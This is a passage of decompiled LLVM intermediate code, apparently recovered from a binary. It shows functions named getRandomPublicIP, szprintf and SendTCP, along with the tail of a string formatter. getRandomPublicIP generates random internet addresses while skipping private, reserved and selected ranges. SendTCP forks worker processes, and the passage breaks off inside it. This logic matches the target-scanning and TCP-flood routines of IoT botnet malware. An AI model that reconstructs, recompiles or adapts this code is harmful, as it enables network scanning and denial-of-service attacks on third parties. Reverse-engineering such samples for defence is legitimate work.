  store i8 %v1_1000a118, i8* %tmp, align 1
  br label %dec_label_pc_1000a144

dec_label_pc_1000a12c:                            ; preds = %dec_label_pc_1000a0e0
  %v3_1000a130 = load i32, i32* %v2_10009fa8, align 4
  %v1_1000a138 = add i32 %v3_1000a130, 4
  store i32 %v1_1000a138, i32* %v2_10009fa8, align 4
  br label %dec_label_pc_1000a144

dec_label_pc_1000a144:                            ; preds = %dec_label_pc_1000a0f4, %dec_label_pc_1000a12c
  %stack_var_-32.0 = phi i32 [ %v3_1000a130, %dec_label_pc_1000a12c ], [ %v2_1000a110, %dec_label_pc_1000a0f4 ]
  %v1_1000a148 = inttoptr i32 %stack_var_-32.0 to i32*
  %v2_1000a148 = load i32, i32* %v1_1000a148, align 4
  %v7_1000a168 = call i32 @printi(i32 %tmp41, i32 %v2_1000a148, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_1000a174 = add i32 %v7_1000a168, %stack_var_-56.132
  br label %dec_label_pc_1000a3c8

dec_label_pc_1000a180:                            ; preds = %dec_label_pc_1000a0cc
  %v2_1000a184 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_1000a18c = icmp eq i8 %v2_1000a184, 88
  br i1 %v3_1000a18c, label %dec_label_pc_1000a194, label %dec_label_pc_1000a234

dec_label_pc_1000a194:                            ; preds = %dec_label_pc_1000a180
  %v2_1000a198 = load i8, i8* %tmp, align 1
  %tmp68 = icmp ugt i8 %v2_1000a198, 7
  br i1 %tmp68, label %dec_label_pc_1000a1e0, label %dec_label_pc_1000a1a8

dec_label_pc_1000a1a8:                            ; preds = %dec_label_pc_1000a194
  %v3_1000a1ac = load i32, i32* %v2_10009f70, align 4
  %v2_1000a1b4 = load i8, i8* %tmp, align 1
  %v3_1000a1b4 = zext i8 %v2_1000a1b4 to i32
  %v1_1000a1c0 = mul nuw nsw i32 %v3_1000a1b4, 4
  %v2_1000a1c4 = add i32 %v1_1000a1c0, %v3_1000a1ac
  %v1_1000a1cc = add i8 %v2_1000a1b4, 1
  store i8 %v1_1000a1cc, i8* %tmp, align 1
  br label %dec_label_pc_1000a1f8

dec_label_pc_1000a1e0:                            ; preds = %dec_label_pc_1000a194
  %v3_1000a1e4 = load i32, i32* %v2_10009fa8, align 4
  %v1_1000a1ec = add i32 %v3_1000a1e4, 4
  store i32 %v1_1000a1ec, i32* %v2_10009fa8, align 4
  br label %dec_label_pc_1000a1f8

dec_label_pc_1000a1f8:                            ; preds = %dec_label_pc_1000a1a8, %dec_label_pc_1000a1e0
  %stack_var_-36.0 = phi i32 [ %v3_1000a1e4, %dec_label_pc_1000a1e0 ], [ %v2_1000a1c4, %dec_label_pc_1000a1a8 ]
  %v1_1000a1fc = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_1000a1fc = load i32, i32* %v1_1000a1fc, align 4
  %v7_1000a21c = call i32 @printi(i32 %tmp41, i32 %v2_1000a1fc, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 65)
  %v2_1000a228 = add i32 %v7_1000a21c, %stack_var_-56.132
  br label %dec_label_pc_1000a3c8

dec_label_pc_1000a234:                            ; preds = %dec_label_pc_1000a180
  %v2_1000a238 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_1000a240 = icmp eq i8 %v2_1000a238, 117
  br i1 %v3_1000a240, label %dec_label_pc_1000a248, label %dec_label_pc_1000a2e8

dec_label_pc_1000a248:                            ; preds = %dec_label_pc_1000a234
  %v2_1000a24c = load i8, i8* %tmp, align 1
  %tmp69 = icmp ugt i8 %v2_1000a24c, 7
  br i1 %tmp69, label %dec_label_pc_1000a294, label %dec_label_pc_1000a25c

dec_label_pc_1000a25c:                            ; preds = %dec_label_pc_1000a248
  %v3_1000a260 = load i32, i32* %v2_10009f70, align 4
  %v2_1000a268 = load i8, i8* %tmp, align 1
  %v3_1000a268 = zext i8 %v2_1000a268 to i32
  %v1_1000a274 = mul nuw nsw i32 %v3_1000a268, 4
  %v2_1000a278 = add i32 %v1_1000a274, %v3_1000a260
  %v1_1000a280 = add i8 %v2_1000a268, 1
  store i8 %v1_1000a280, i8* %tmp, align 1
  br label %dec_label_pc_1000a2ac

dec_label_pc_1000a294:                            ; preds = %dec_label_pc_1000a248
  %v3_1000a298 = load i32, i32* %v2_10009fa8, align 4
  %v1_1000a2a0 = add i32 %v3_1000a298, 4
  store i32 %v1_1000a2a0, i32* %v2_10009fa8, align 4
  br label %dec_label_pc_1000a2ac

dec_label_pc_1000a2ac:                            ; preds = %dec_label_pc_1000a25c, %dec_label_pc_1000a294
  %stack_var_-40.0 = phi i32 [ %v3_1000a298, %dec_label_pc_1000a294 ], [ %v2_1000a278, %dec_label_pc_1000a25c ]
  %v1_1000a2b0 = inttoptr i32 %stack_var_-40.0 to i32*
  %v2_1000a2b0 = load i32, i32* %v1_1000a2b0, align 4
  %v7_1000a2d0 = call i32 @printi(i32 %tmp41, i32 %v2_1000a2b0, i32 10, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_1000a2dc = add i32 %v7_1000a2d0, %stack_var_-56.132
  br label %dec_label_pc_1000a3c8

dec_label_pc_1000a2e8:                            ; preds = %dec_label_pc_1000a234
  %v2_1000a2ec = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_1000a2f4 = icmp eq i8 %v2_1000a2ec, 99
  br i1 %v3_1000a2f4, label %dec_label_pc_1000a2fc, label %dec_label_pc_1000a3c8

dec_label_pc_1000a2fc:                            ; preds = %dec_label_pc_1000a2e8
  %v2_1000a300 = load i8, i8* %tmp, align 1
  %tmp70 = icmp ugt i8 %v2_1000a300, 7
  br i1 %tmp70, label %dec_label_pc_1000a348, label %dec_label_pc_1000a310

dec_label_pc_1000a310:                            ; preds = %dec_label_pc_1000a2fc
  %v3_1000a314 = load i32, i32* %v2_10009f70, align 4
  %v2_1000a31c = load i8, i8* %tmp, align 1
  %v3_1000a31c = zext i8 %v2_1000a31c to i32
  %v1_1000a328 = mul nuw nsw i32 %v3_1000a31c, 4
  %v2_1000a32c = add i32 %v1_1000a328, %v3_1000a314
  %v1_1000a334 = add i8 %v2_1000a31c, 1
  store i8 %v1_1000a334, i8* %tmp, align 1
  br label %dec_label_pc_1000a360

dec_label_pc_1000a348:                            ; preds = %dec_label_pc_1000a2fc
  %v3_1000a34c = load i32, i32* %v2_10009fa8, align 4
  %v1_1000a354 = add i32 %v3_1000a34c, 4
  store i32 %v1_1000a354, i32* %v2_10009fa8, align 4
  br label %dec_label_pc_1000a360

dec_label_pc_1000a360:                            ; preds = %dec_label_pc_1000a310, %dec_label_pc_1000a348
  %stack_var_-44.0 = phi i32 [ %v3_1000a34c, %dec_label_pc_1000a348 ], [ %v2_1000a32c, %dec_label_pc_1000a310 ]
  %v1_1000a364 = inttoptr i32 %stack_var_-44.0 to i32*
  %v2_1000a364 = load i32, i32* %v1_1000a364, align 4
  %v1_1000a368 = urem i32 %v2_1000a364, 256
  store i32 %v1_1000a368, i32* %stack_var_-88, align 4
  %v5_1000a38c = call i32 @prints(i32 %tmp41, i8* %v4_1000a38c, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa)
  %v2_1000a398 = add i32 %v5_1000a38c, %stack_var_-56.132
  br label %dec_label_pc_1000a3c8

dec_label_pc_1000a3a4:                            ; preds = %dec_label_pc_10009e34, %dec_label_pc_10009e78
  %stack_var_-68.2 = phi i8* [ %v5_10009e50, %dec_label_pc_10009e78 ], [ %stack_var_-68.434, %dec_label_pc_10009e34 ]
  %v2_1000a3a8 = load i8, i8* %stack_var_-68.2, align 1
  %v3_1000a3a8 = zext i8 %v2_1000a3a8 to i32
  %v3_1000a3b8 = call i32 @printchar(i32* %arg1, i32 %v3_1000a3a8)
  %v1_1000a3c0 = add i32 %stack_var_-56.132, 1
  br label %dec_label_pc_1000a3c8

dec_label_pc_1000a3c8:                            ; preds = %dec_label_pc_1000a2e8, %dec_label_pc_1000a360, %dec_label_pc_1000a2ac, %dec_label_pc_1000a1f8, %dec_label_pc_1000a144, %dec_label_pc_1000a090, %dec_label_pc_10009fec, %dec_label_pc_1000a3a4
  %stack_var_-56.0 = phi i32 [ %v1_1000a3c0, %dec_label_pc_1000a3a4 ], [ %v2_1000a00c, %dec_label_pc_10009fec ], [ %v2_1000a0c0, %dec_label_pc_1000a090 ], [ %v2_1000a174, %dec_label_pc_1000a144 ], [ %v2_1000a228, %dec_label_pc_1000a1f8 ], [ %v2_1000a2dc, %dec_label_pc_1000a2ac ], [ %v2_1000a398, %dec_label_pc_1000a360 ], [ %stack_var_-56.132, %dec_label_pc_1000a2e8 ]
  %stack_var_-68.3 = phi i8* [ %stack_var_-68.2, %dec_label_pc_1000a3a4 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10009fec ], [ %stack_var_-68.1.lcssa, %dec_label_pc_1000a090 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_1000a144 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_1000a1f8 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_1000a2ac ], [ %stack_var_-68.1.lcssa, %dec_label_pc_1000a360 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_1000a2e8 ]
  %v4_1000a3c8 = ptrtoint i8* %stack_var_-68.3 to i32
  %v1_1000a3cc = add i32 %v4_1000a3c8, 1
  %stack_var_-68.4 = inttoptr i32 %v1_1000a3cc to i8*
  %v2_1000a3d8 = load i8, i8* %stack_var_-68.4, align 1
  %v3_1000a3e0 = icmp eq i8 %v2_1000a3d8, 0
  br i1 %v3_1000a3e0, label %dec_label_pc_1000a3e8, label %dec_label_pc_10009e34

dec_label_pc_1000a3e8:                            ; preds = %dec_label_pc_10009e48, %dec_label_pc_1000a3c8, %entry
  %stack_var_-56.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-56.132, %dec_label_pc_10009e48 ], [ %stack_var_-56.0, %dec_label_pc_1000a3c8 ]
  %v3_1000a3ec = icmp eq i32* %arg1, null
  br i1 %v3_1000a3ec, label %dec_label_pc_1000a404, label %dec_label_pc_1000a3f4

dec_label_pc_1000a3f4:                            ; preds = %dec_label_pc_1000a3e8
  %v2_1000a3f8 = load i32, i32* %arg1, align 4
  %v3_1000a400 = inttoptr i32 %v2_1000a3f8 to i8*
  store i8 0, i8* %v3_1000a400, align 1
  br label %dec_label_pc_1000a404

dec_label_pc_1000a404:                            ; preds = %dec_label_pc_1000a3e8, %dec_label_pc_1000a3f4
  ret i32 %stack_var_-56.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-68.4, { 1, 0 }
  uselistorder i8* %stack_var_-68.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_-68.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-52.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10009ebc, { 1, 0 }
  uselistorder i32 %stack_var_-52.0.ph, { 1, 0 }
  uselistorder i8* %v5_10009e50, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-56.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-68.4.in33, { 1, 0 }
  uselistorder i32* %v2_10009fa8, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i32* %stack_var_-88, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_1000a404, { 1, 0 }
  uselistorder label %dec_label_pc_1000a3e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a3c8, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_1000a3a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000a360, { 1, 0 }
  uselistorder label %dec_label_pc_1000a2ac, { 1, 0 }
  uselistorder label %dec_label_pc_1000a1f8, { 1, 0 }
  uselistorder label %dec_label_pc_1000a144, { 1, 0 }
  uselistorder label %dec_label_pc_1000a090, { 1, 0 }
  uselistorder label %dec_label_pc_10009fec, { 1, 0 }
  uselistorder label %dec_label_pc_10009fbc, { 1, 0 }
  uselistorder label %dec_label_pc_10009f44, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10009f30, { 1, 0 }
  uselistorder label %dec_label_pc_10009eb8, { 1, 0 }
  uselistorder label %dec_label_pc_10009e34, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg6, i32* @r8, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-120, align 4
  store i32 2, i32* %stack_var_-136, align 4
  %v2_1000a4a8 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268477620, i32* @lr, align 4
  %v4_1000a4b0 = call i32 @print(i32* nonnull %stack_var_-120, i32 %arg2, i32 %v2_1000a4a8)
  ret i32 %v4_1000a4b0

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
}

define i32 @getRandomPublicIP(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 268477684, i32* @lr, align 4
  %v0_1000a4f0 = call i32 @random()
  %v2_1000a510 = srem i32 %v0_1000a4f0, 224
  %v6_1000a530 = trunc i32 %v2_1000a510 to i8
  store i32 268477752, i32* @lr, align 4
  %v0_1000a534 = call i32 @random()
  %v2_1000a554 = srem i32 %v0_1000a534, 255
  %v1_1000a574 = trunc i32 %v2_1000a554 to i8
  store i32 268477820, i32* @lr, align 4
  %v0_1000a578 = call i32 @random()
  %v2_1000a598 = srem i32 %v0_1000a578, 255
  %v1_1000a5b8 = trunc i32 %v2_1000a598 to i8
  store i32 268477888, i32* @lr, align 4
  %v0_1000a5bc = call i32 @random()
  br label %dec_label_pc_1000a714

dec_label_pc_1000a604:                            ; preds = %dec_label_pc_1000a7b8, %dec_label_pc_1000a9b8, %dec_label_pc_1000a998, %dec_label_pc_1000a988, %dec_label_pc_1000a968, %dec_label_pc_1000a948, %dec_label_pc_1000a918, %dec_label_pc_1000a8e8, %dec_label_pc_1000a8c8, %dec_label_pc_1000a898, %dec_label_pc_1000a868, %dec_label_pc_1000a858, %dec_label_pc_1000a838, %dec_label_pc_1000a818, %dec_label_pc_1000a7e8, %dec_label_pc_1000a788, %dec_label_pc_1000a768, %dec_label_pc_1000a754, %dec_label_pc_1000a724, %dec_label_pc_1000a714
  store i32 268477960, i32* @lr, align 4
  %v0_1000a604 = call i32 @random()
  %v2_1000a624 = srem i32 %v0_1000a604, 224
  %v6_1000a644 = trunc i32 %v2_1000a624 to i8
  store i32 268478028, i32* @lr, align 4
  %v0_1000a648 = call i32 @random()
  %v2_1000a668 = srem i32 %v0_1000a648, 255
  %v1_1000a688 = trunc i32 %v2_1000a668 to i8
  store i32 268478096, i32* @lr, align 4
  %v0_1000a68c = call i32 @random()
  %v2_1000a6ac = srem i32 %v0_1000a68c, 255
  %v1_1000a6cc = trunc i32 %v2_1000a6ac to i8
  store i32 268478164, i32* @lr, align 4
  %v0_1000a6d0 = call i32 @random()
  br label %dec_label_pc_1000a714

dec_label_pc_1000a714:                            ; preds = %entry, %dec_label_pc_1000a604
  %storemerge.in = phi i32 [ %v0_1000a5bc, %entry ], [ %v0_1000a6d0, %dec_label_pc_1000a604 ]
  %stack_var_-70.0 = phi i8 [ %v1_1000a5b8, %entry ], [ %v1_1000a6cc, %dec_label_pc_1000a604 ]
  %stack_var_-71.0 = phi i8 [ %v1_1000a574, %entry ], [ %v1_1000a688, %dec_label_pc_1000a604 ]
  %stack_var_-72.0 = phi i8 [ %v6_1000a530, %entry ], [ %v6_1000a644, %dec_label_pc_1000a604 ]
  %storemerge = srem i32 %storemerge.in, 255
  %v4_1000a7142 = zext i8 %stack_var_-72.0 to i32
  %v3_1000a71c = icmp eq i8 %stack_var_-72.0, 0
  br i1 %v3_1000a71c, label %dec_label_pc_1000a604, label %dec_label_pc_1000a724

dec_label_pc_1000a724:                            ; preds = %dec_label_pc_1000a714
  %v3_1000a72c = icmp eq i8 %stack_var_-72.0, 10
  br i1 %v3_1000a72c, label %dec_label_pc_1000a604, label %dec_label_pc_1000a734

dec_label_pc_1000a734:                            ; preds = %dec_label_pc_1000a724
  %v3_1000a73c = icmp eq i8 %stack_var_-72.0, 100
  br i1 %v3_1000a73c, label %dec_label_pc_1000a744, label %dec_label_pc_1000a768

dec_label_pc_1000a744:                            ; preds = %dec_label_pc_1000a734
  %tmp50 = icmp ult i8 %stack_var_-71.0, 64
  br i1 %tmp50, label %dec_label_pc_1000a768, label %dec_label_pc_1000a754

dec_label_pc_1000a754:                            ; preds = %dec_label_pc_1000a744
  %tmp51 = icmp sgt i8 %stack_var_-71.0, -1
  br i1 %tmp51, label %dec_label_pc_1000a604, label %dec_label_pc_1000a768

dec_label_pc_1000a768:                            ; preds = %dec_label_pc_1000a734, %dec_label_pc_1000a754, %dec_label_pc_1000a744
  %v3_1000a770 = icmp eq i8 %stack_var_-72.0, 127
  br i1 %v3_1000a770, label %dec_label_pc_1000a604, label %dec_label_pc_1000a778

dec_label_pc_1000a778:                            ; preds = %dec_label_pc_1000a768
  %v3_1000a780 = icmp eq i8 %stack_var_-72.0, -87
  br i1 %v3_1000a780, label %dec_label_pc_1000a788, label %dec_label_pc_1000a798

dec_label_pc_1000a788:                            ; preds = %dec_label_pc_1000a778
  %v3_1000a790 = icmp eq i8 %stack_var_-71.0, -2
  br i1 %v3_1000a790, label %dec_label_pc_1000a604, label %dec_label_pc_1000a798

dec_label_pc_1000a798:                            ; preds = %dec_label_pc_1000a778, %dec_label_pc_1000a788
  %v3_1000a7a0 = icmp eq i8 %stack_var_-72.0, -84
  br i1 %v3_1000a7a0, label %dec_label_pc_1000a7a8, label %dec_label_pc_1000a7c8

dec_label_pc_1000a7a8:                            ; preds = %dec_label_pc_1000a798
  %v2_1000a7b0 = icmp ugt i8 %stack_var_-71.0, 16
  br i1 %v2_1000a7b0, label %dec_label_pc_1000a7c8, label %dec_label_pc_1000a7b8

dec_label_pc_1000a7b8:                            ; preds = %dec_label_pc_1000a7a8
  br label %dec_label_pc_1000a604

dec_label_pc_1000a7c8:                            ; preds = %dec_label_pc_1000a798, %dec_label_pc_1000a7a8
  %v3_1000a7d0 = icmp eq i8 %stack_var_-72.0, -64
  br i1 %v3_1000a7d0, label %dec_label_pc_1000a7d8, label %dec_label_pc_1000a828

dec_label_pc_1000a7d8:                            ; preds = %dec_label_pc_1000a7c8
  %v3_1000a7e0 = icmp eq i8 %stack_var_-71.0, 0
  br i1 %v3_1000a7e0, label %dec_label_pc_1000a7e8, label %dec_label_pc_1000a808

dec_label_pc_1000a7e8:                            ; preds = %dec_label_pc_1000a7d8
  %v3_1000a7f0 = icmp eq i8 %stack_var_-70.0, 2
  br i1 %v3_1000a7f0, label %dec_label_pc_1000a604, label %dec_label_pc_1000a808

dec_label_pc_1000a808:                            ; preds = %dec_label_pc_1000a7d8, %dec_label_pc_1000a7e8
  %v3_1000a810 = icmp eq i8 %stack_var_-71.0, 88
  br i1 %v3_1000a810, label %dec_label_pc_1000a818, label %dec_label_pc_1000a838

dec_label_pc_1000a818:                            ; preds = %dec_label_pc_1000a808
  %v3_1000a820 = icmp eq i8 %stack_var_-70.0, 99
  br i1 %v3_1000a820, label %dec_label_pc_1000a604, label %dec_label_pc_1000a838

dec_label_pc_1000a828:                            ; preds = %dec_label_pc_1000a7c8
  br label %dec_label_pc_1000a848

dec_label_pc_1000a838:                            ; preds = %dec_label_pc_1000a808, %dec_label_pc_1000a818
  %v3_1000a840 = icmp eq i8 %stack_var_-71.0, -88
  br i1 %v3_1000a840, label %dec_label_pc_1000a604, label %dec_label_pc_1000a848

dec_label_pc_1000a848:                            ; preds = %dec_label_pc_1000a828, %dec_label_pc_1000a838
  %v3_1000a850 = icmp eq i8 %stack_var_-72.0, -58
  br i1 %v3_1000a850, label %dec_label_pc_1000a858, label %dec_label_pc_1000a878

dec_label_pc_1000a858:                            ; preds = %dec_label_pc_1000a848
  %v3_1000a860 = icmp eq i8 %stack_var_-71.0, 18
  br i1 %v3_1000a860, label %dec_label_pc_1000a604, label %dec_label_pc_1000a868

dec_label_pc_1000a868:                            ; preds = %dec_label_pc_1000a858
  %v3_1000a870 = icmp eq i8 %stack_var_-71.0, 19
  br i1 %v3_1000a870, label %dec_label_pc_1000a604, label %dec_label_pc_1000a888

dec_label_pc_1000a878:                            ; preds = %dec_label_pc_1000a848
  br label %dec_label_pc_1000a8a8

dec_label_pc_1000a888:                            ; preds = %dec_label_pc_1000a868
  %v3_1000a890 = icmp eq i8 %stack_var_-71.0, 51
  br i1 %v3_1000a890, label %dec_label_pc_1000a898, label %dec_label_pc_1000a8a8

dec_label_pc_1000a898:                            ; preds = %dec_label_pc_1000a888
  %v3_1000a8a0 = icmp eq i8 %stack_var_-70.0, 100
  br i1 %v3_1000a8a0, label %dec_label_pc_1000a604, label %dec_label_pc_1000a8a8

dec_label_pc_1000a8a8:                            ; preds = %dec_label_pc_1000a878, %dec_label_pc_1000a888, %dec_label_pc_1000a898
  %v3_1000a8b0 = icmp eq i8 %stack_var_-72.0, -53
  br i1 %v3_1000a8b0, label %dec_label_pc_1000a8b8, label %dec_label_pc_1000a8d8

dec_label_pc_1000a8b8:                            ; preds = %dec_label_pc_1000a8a8
  %v3_1000a8c0 = icmp eq i8 %stack_var_-71.0, 0
  br i1 %v3_1000a8c0, label %dec_label_pc_1000a8c8, label %dec_label_pc_1000a8d8

dec_label_pc_1000a8c8:                            ; preds = %dec_label_pc_1000a8b8
  %v3_1000a8d0 = icmp eq i8 %stack_var_-70.0, 113
  br i1 %v3_1000a8d0, label %dec_label_pc_1000a604, label %dec_label_pc_1000a8d8

dec_label_pc_1000a8d8:                            ; preds = %dec_label_pc_1000a8b8, %dec_label_pc_1000a8a8, %dec_label_pc_1000a8c8
  %v3_1000a8e0 = icmp eq i8 %stack_var_-72.0, 62
  br i1 %v3_1000a8e0, label %dec_label_pc_1000a8e8, label %dec_label_pc_1000a8f8

dec_label_pc_1000a8e8:                            ; preds = %dec_label_pc_1000a8d8
  %tmp52 = icmp ult i8 %stack_var_-71.0, 31
  br i1 %tmp52, label %dec_label_pc_1000a604, label %dec_label_pc_1000a8f8

dec_label_pc_1000a8f8:                            ; preds = %dec_label_pc_1000a8d8, %dec_label_pc_1000a8e8
  %v3_1000a900 = icmp eq i8 %stack_var_-72.0, -49
  br i1 %v3_1000a900, label %dec_label_pc_1000a908, label %dec_label_pc_1000a928

dec_label_pc_1000a908:                            ; preds = %dec_label_pc_1000a8f8
  %tmp53 = icmp ult i8 %stack_var_-71.0, 31
  br i1 %tmp53, label %dec_label_pc_1000a928, label %dec_label_pc_1000a918

dec_label_pc_1000a918:                            ; preds = %dec_label_pc_1000a908
  %tmp54 = icmp ult i8 %stack_var_-70.0, 121
  br i1 %tmp54, label %dec_label_pc_1000a604, label %dec_label_pc_1000a928

dec_label_pc_1000a928:                            ; preds = %dec_label_pc_1000a8f8, %dec_label_pc_1000a918, %dec_label_pc_1000a908
  %v3_1000a930 = icmp eq i8 %stack_var_-72.0, 65
  br i1 %v3_1000a930, label %dec_label_pc_1000a938, label %dec_label_pc_1000a958

dec_label_pc_1000a938:                            ; preds = %dec_label_pc_1000a928
  %tmp55 = icmp ult i8 %stack_var_-71.0, -32
  br i1 %tmp55, label %dec_label_pc_1000a958, label %dec_label_pc_1000a948

dec_label_pc_1000a948:                            ; preds = %dec_label_pc_1000a938
  %tmp56 = icmp ult i8 %stack_var_-70.0, -29
  br i1 %tmp56, label %dec_label_pc_1000a604, label %dec_label_pc_1000a958

dec_label_pc_1000a958:                            ; preds = %dec_label_pc_1000a928, %dec_label_pc_1000a948, %dec_label_pc_1000a938
  %v3_1000a960 = icmp eq i8 %stack_var_-72.0, -61
  br i1 %v3_1000a960, label %dec_label_pc_1000a968, label %dec_label_pc_1000a978

dec_label_pc_1000a968:                            ; preds = %dec_label_pc_1000a958
  %v3_1000a970 = icmp eq i8 %stack_var_-71.0, 10
  br i1 %v3_1000a970, label %dec_label_pc_1000a604, label %dec_label_pc_1000a978

dec_label_pc_1000a978:                            ; preds = %dec_label_pc_1000a958, %dec_label_pc_1000a968
  %v3_1000a980 = icmp eq i8 %stack_var_-72.0, -40
  %v4_1000a988 = zext i8 %stack_var_-71.0 to i32
  br i1 %v3_1000a980, label %dec_label_pc_1000a988, label %dec_label_pc_1000a9a8

dec_label_pc_1000a988:                            ; preds = %dec_label_pc_1000a978
  %v3_1000a990 = icmp eq i8 %stack_var_-71.0, 25
  br i1 %v3_1000a990, label %dec_label_pc_1000a604, label %dec_label_pc_1000a998

dec_label_pc_1000a998:                            ; preds = %dec_label_pc_1000a988
  %v3_1000a9a0 = icmp eq i8 %stack_var_-71.0, 94
  br i1 %v3_1000a9a0, label %dec_label_pc_1000a604, label %dec_label_pc_1000a9a8

dec_label_pc_1000a9a8:                            ; preds = %dec_label_pc_1000a978, %dec_label_pc_1000a998
  %v3_1000a9b0 = icmp eq i8 %stack_var_-72.0, -44
  br i1 %v3_1000a9b0, label %dec_label_pc_1000a9b8, label %dec_label_pc_1000a9c8

dec_label_pc_1000a9b8:                            ; preds = %dec_label_pc_1000a9a8
  %v3_1000a9c0 = icmp eq i8 %stack_var_-71.0, 56
  br i1 %v3_1000a9c0, label %dec_label_pc_1000a604, label %dec_label_pc_1000a9c8

dec_label_pc_1000a9c8:                            ; preds = %dec_label_pc_1000a9a8, %dec_label_pc_1000a9b8
  store i32 0, i32* %stack_var_-68, align 4
  %v2_1000a9e8 = ptrtoint i32* %stack_var_-68 to i32
  %v4_1000aa0c = zext i8 %stack_var_-70.0 to i32
  %v4_1000aa18 = urem i32 %storemerge, 256
  %v7_1000aa3c = call i32 @szprintf(i32 %v2_1000a9e8, i32 ptrtoint ([12 x i8]* @global_var_1002abfc.276 to i32), i32 %v4_1000a7142, i32 %v4_1000a988, i32 %v4_1000aa0c, i32 %v4_1000aa18)
  store i32 268479052, i32* @lr, align 4
  %v1_1000aa48 = call i32 @inet_addr(i32 %v2_1000a9e8)
  ret i32 %v1_1000aa48

; uselistorder directives
  uselistorder i32 %v2_1000a9e8, { 1, 0 }
  uselistorder i8 %stack_var_-72.0, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i8 %stack_var_-71.0, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 18 }
  uselistorder i8 %stack_var_-70.0, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32 ptrtoint ([12 x i8]* @global_var_1002abfc.276 to i32), { 0, 1, 6, 2, 7, 3, 8, 4, 9, 5, 10 }
  uselistorder label %dec_label_pc_1000a9c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000a9a8, { 1, 0 }
  uselistorder label %dec_label_pc_1000a978, { 1, 0 }
  uselistorder label %dec_label_pc_1000a958, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000a928, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000a8f8, { 1, 0 }
  uselistorder label %dec_label_pc_1000a8d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a8a8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000a848, { 1, 0 }
  uselistorder label %dec_label_pc_1000a838, { 1, 0 }
  uselistorder label %dec_label_pc_1000a808, { 1, 0 }
  uselistorder label %dec_label_pc_1000a7c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000a798, { 1, 0 }
  uselistorder label %dec_label_pc_1000a768, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000a714, { 1, 0 }
  uselistorder label %dec_label_pc_1000a604, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 15, 16, 17, 18, 19 }
}

define i32 @SendTCP(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000aa6c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000aa6c, i32* %stack_var_-144, align 4
  store i32 268479124, i32* @lr, align 4
  %v0_1000aa90 = call i32 @listFork()
  %v3_1000aa98 = icmp eq i32 %v0_1000aa90, 0
  br i1 %v3_1000aa98, label %dec_label_pc_1000aaa4, label %dec_label_pc_1000b164

dec_label_pc_1000aaa4:                            ; preds = %entry
  %v2_1000aab0 = load i32, i32* %arg1, align 4
  %v1_1000aabc = add i32 %tmp, 4
  %v2_1000aabc = inttoptr i32 %v1_1000aabc to i32*
  %v3_1000aabc = load i32, i32* %v2_1000aabc, align 4
  %v1_1000aac8 = add i32 %tmp, 8
  %v2_1000aac8 = inttoptr i32 %v1_1000aac8 to i32*
  %v3_1000aac8 = load i32, i32* %v2_1000aac8, align 4
  %v1_1000aad4 = add i32 %tmp, 12
